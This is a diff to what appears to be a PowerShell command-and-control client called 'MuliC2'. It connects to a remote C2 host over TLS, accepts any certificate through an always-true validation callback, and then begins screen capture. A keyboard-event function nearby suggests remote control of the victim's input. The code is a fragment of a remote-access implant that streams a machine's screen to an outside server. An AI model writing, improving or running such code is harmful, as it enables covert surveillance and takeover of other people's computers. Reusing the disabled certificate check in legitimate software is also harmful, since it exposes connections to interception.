@@ -316,26 +316,24 @@ function Invoke-KeyboardEvent {
 try {
     Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
     $global:tcpClient = New-Object System.Net.Sockets.TcpClient
-    $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
-    $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne(10000, $false)
-    if (-not $waitSuccess -or -not $global:tcpClient.Connected) {
-        throw "Connection to $C2Host`:$C2Port failed or timed out"
-    }
-    $global:tcpClient.EndConnect($asyncResult)
-    Write-Host "[+] TCP connection established" -ForegroundColor Green
+    $global:tcpClient.Connect($C2Host, $C2Port)
     $tcpStream = $global:tcpClient.GetStream()
-    Write-Host "[*] Attempting SSL authentication (no cert validation)..." -ForegroundColor Cyan
     $global:sslStream = New-Object System.Net.Security.SslStream(
         $tcpStream,
         $false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] { return $true })
+        ([System.Net.Security.RemoteCertificateValidationCallback] { return $true }) # Accept any cert, including self-signed
     )
-    $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+    # Try TLS 1.3, fallback to 1.2 if not supported
+    try {
+        $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls13, $false)
+    } catch {
+        $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+    }
     if ($global:sslStream.IsAuthenticated) {
-        Write-Host "[+] SSL connection established and authenticated (no cert validation)" -ForegroundColor Green
+        Write-Host "[+] SSL/TLS connection established (accepting any certificate, including self-signed)"
         $stream = $global:sslStream
     } else {
-        throw "SSL authentication failed - stream not authenticated"
+        throw "SSL authentication failed"
     }
     
     Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
